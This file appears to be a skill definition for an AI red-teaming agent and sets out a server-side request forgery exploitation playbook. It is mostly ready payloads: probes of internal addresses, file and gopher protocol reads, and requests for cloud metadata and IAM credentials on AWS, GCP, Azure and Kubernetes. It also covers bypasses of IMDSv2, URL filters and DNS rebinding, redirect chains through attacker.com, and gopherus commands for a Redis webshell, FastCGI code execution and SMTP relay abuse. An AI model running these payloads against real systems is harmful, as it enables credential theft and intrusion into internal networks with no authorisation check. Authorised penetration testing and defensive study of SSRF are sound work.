---
name: ssrf-testing
description: Detect and exploit server-side request forgery to access internal resources and cloud metadata
origin: RedteamOpencode
---

# SSRF Testing

## When to Activate

- Parameter accepts URL/hostname: `url=`, `uri=`, `src=`, `dest=`, `redirect=`, `feed=`, `link=`
- PDF/doc generators fetching remote resources, file upload via URL, API integrations, proxy endpoints

## Detection

### 1. Out-of-Band Confirmation
```bash
?url=http://COLLABORATOR_DOMAIN/ssrf-test
?url=http://YOUR_SERVER:8888/ssrf-test
# Listener: python3 -m http.server 8888 / nc -lvp 8888
```

### 2. Internal Network Probing
```
http://127.0.0.1/  http://localhost/  http://0.0.0.0/  http://[::1]/
http://127.1/  http://0/  http://0x7f000001/  http://2130706433/
http://10.0.0.1/  http://172.16.0.1/  http://192.168.1.1/  http://169.254.169.254/
```

### 3. Protocol Testing
```
file:///etc/passwd                           # File read
gopher://127.0.0.1:6379/_INFO               # Redis
gopher://127.0.0.1:3306/_                   # MySQL
dict://127.0.0.1:6379/INFO                  # Dict
ftp://127.0.0.1/
```

### 4. Port Scanning via SSRF
Test http://127.0.0.1:PORT/ for common ports (22, 80, 3306, 6379, 8080, 9200, 27017).
Indicators: response time diffs, different errors, content length changes, status code diffs.

## Cloud Metadata

### AWS
```
# IMDSv1
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
http://169.254.169.254/latest/user-data
# IMDSv2 requires PUT for token + X-aws-ec2-metadata-token header
```

IMDSv2 enforcement bypass angles worth testing specifically (do not assume IMDSv2-only means the instance is safe from SSRF):
- Hop-limit bypass: IMDSv2's TTL/hop-limit defense (`PUT` request TTL=1 by default) is meant to block SSRF through a proxy, since the extra hop decrements TTL to 0 — but if the vulnerable app *is itself* the EC2 instance issuing the request (classic same-host SSRF, no intermediate proxy hop), TTL=1 is still sufficient and IMDSv2 offers no additional protection; don't rule out metadata access just because you see "IMDSv2 enforced" in a config dump — confirm whether the SSRF primitive is same-host or proxied
- Token caching: if the vulnerable code path can be induced to reuse a token obtained via a legitimate app code path (SSRF into an internal endpoint that itself calls IMDSv2 and caches/logs the token), the `PUT`-then-`GET` requirement can be sidestepped entirely
- Container/ECS task metadata as a softer target: `http://169.254.170.2/v2/credentials/<GUID>` (ECS task role, no token requirement at all) or `$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` — often overlooked when testing focuses only on the classic `169.254.169.254` EC2 endpoint
- Lambda/serverless: `http://169.254.169.254/latest/meta-data/` is unavailable, but check for `AWS_LAMBDA_RUNTIME_API` env-var-driven internal endpoints reachable if the SSRF primitive can read process environment or hit `http://127.0.0.1:9001/2018-06-01/runtime/invocation/next`

### GCP
```
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Requires Metadata-Flavor: Google header (legacy v1beta1 endpoint doesn't)
```

### Azure
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01  # Requires Metadata: true header
```

### Kubernetes
```
file:///var/run/secrets/kubernetes.io/serviceaccount/token
https://kubernetes.default.svc/
```

### Other Cloud/PaaS Providers
```
http://100.100.100.200/latest/meta-data/                       # Alibaba Cloud
http://169.254.169.254/opc/v2/instance/  # Oracle Cloud (requires Authorization: Bearer Oracle header)
http://169.254.169.254/metadata/v1/                             # DigitalOcean
http://169.254.169.254/latest/meta-data/                       # Vultr / most OpenStack-based clouds (also check :80 vs :169.254.169.254 without port)
http://169.254.169.254/latest/api/token                        # Alibaba/AWS-compatible token endpoints on clones
http://metadata/computeMetadata/v1/                             # GCP short-hostname variant (bypasses domain allowlists keyed on the full FQDN)
```

## Redirect-Based SSRF

When direct SSRF payloads are blocked by input validation but the target follows HTTP redirects when fetching a URL, host an attacker-controlled redirect and let the target's own HTTP client do the pivot — validation on the *original* URL never sees the internal target.

```bash
# Attacker-controlled endpoint returns a 302/307 to the real internal target:
# GET /redirect -> 302 Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/
?url=http://attacker.com/redirect

# Open-redirect chaining: reuse an in-scope open-redirect endpoint (see open-redirect-testing)
# as the first hop instead of hosting your own, to stay inside an allowlist keyed on the app's own domain:
?url=https://target.com/logout?next=http://169.254.169.254/latest/meta-data/

# Protocol-switch redirect: start with http:// (passes an allowlist scoped to http) and 302 to
# gopher:///file:// to reach a protocol the validator never expected to see mid-chain
?url=http://attacker.com/redirect-to-gopher
```

Test whether the fetcher validates only the initial URL (most common bug), re-validates on every hop, or caps the number of redirects followed (an uncapped chain is also a DoS/SSRF-amplification vector in its own right). If the app uses a URL-fetching library, check its default redirect-following behavior (many follow by default with no re-validation hook) and whether `Location` headers pointing to `file://`/`gopher://`/`dict://` are honored — some HTTP clients will follow a scheme-changing redirect even when the app only intended to permit `http(s)`.

## Filter Bypass

### IP Encoding
```
http://2130706433/  http://0x7f000001/  http://0177.0.0.01/  # Decimal/Hex/Octal for 127.0.0.1
http://[::ffff:127.0.0.1]/  http://127.0.0x0.1/             # IPv6/mixed
http://017700000001/                                          # Full-octal single-integer form
http://0x7f.0x0.0x0.0x1/                                       # Per-octet hex
http://127.0.0.1:80%2523@allowed.com/                          # Double-encoded port/fragment confusion
http://[0:0:0:0:0:ffff:127.0.0.1]/                              # Expanded IPv4-mapped IPv6
http://[::]/                                                    # IPv6 unspecified address (often resolves to localhost)
http://127.000.000.001/                                        # Zero-padded octets — some parsers normalize, others reject differently than the validator
```

### DNS Rebinding
```
# 127.0.0.1.nip.io  127-0-0-1.sslip.io  rbndr.us/dword
# Set up a domain with TTL=0 that resolves to an allowlisted IP on the first (validation) lookup
# and to 127.0.0.1/internal IP on the second (fetch) lookup — exploits TOCTOU between validate and connect
# Tools: singularity-of-origin, rbndr.us DNS-rebinding-as-a-service
```

### URL Parsing Tricks
```
http://attacker.com@127.0.0.1/          # Credential section bypass
http://127.0.0.1#@attacker.com/
http://allowed-domain.com/redirect?url=http://127.0.0.1/  # Redirect chain
http://allowed.com\@127.0.0.1/          # Backslash
http://127.0.0.1.allowed.com/          # Subdomain wildcard
http://allowed.com%2F%2F@127.0.0.1/     # Double-slash + credential confusion across differing URL parsers (browser vs. backend HTTP client vs. WAF)
http://allowed.com.127.0.0.1.nip.io/    # Wildcard-DNS host masquerading as a subdomain of the allowlisted domain
https+unix://%2Fvar%2Frun%2Fdocker.sock/containers/json  # Unix-socket scheme smuggling (Python requests-unixsocket / similar libs)
javascript:fetch('http://169.254.169.254/')  # If the "URL" is rendered client-side (e.g. preview/screenshot service using headless Chrome)
```

### Gopher Protocol Smuggling
```bash
# Redis webshell, MySQL, SMTP — use Gopherus tool:
gopherus --exploit redis
gopherus --exploit mysql
gopherus --exploit smtp        # Send arbitrary email via internal MTA (phishing/relay abuse pivot)
gopherus --exploit fastcgi     # Reach PHP-FPM/FastCGI over gopher for RCE — chain into `fastcgi-service-testing`
gopherus --exploit memcache    # Poison/read internal memcached keys
gopherus --exploit zabbix      # Zabbix agent command injection via crafted gopher payload
gopherus --exploit smtp -i attacker@internal -m 'body' -t victim@internal   # Craft raw SMTP over gopher when direct SMTP is filtered but SSRF isn't
```

### Response-Based Blind SSRF Confirmation
```
# When there's no direct response reflection and no OOB network egress (fully blind SSRF):
# - Time-based: compare response latency for a reachable internal IP:port vs. an unreachable one (filtered/closed port times out differently than RST)
# - DNS-only exfil: use a subdomain-per-probe payload (http://PROBE_ID.collaborator.net/) even when HTTP callback is blocked — DNS resolution alone often isn't filtered
# - Error-message differential: compare "connection refused" vs "connection timed out" vs "invalid host" response bodies/status codes across probed targets to fingerprint firewall rules
```

## Internal Service Targets
```
http://127.0.0.1:9200/_cat/indices     # Elasticsearch
http://127.0.0.1:2375/containers/json  # Docker API
http://127.0.0.1:8500/v1/kv/?recurse   # Consul
https://127.0.0.1:10250/pods/          # Kubelet
```
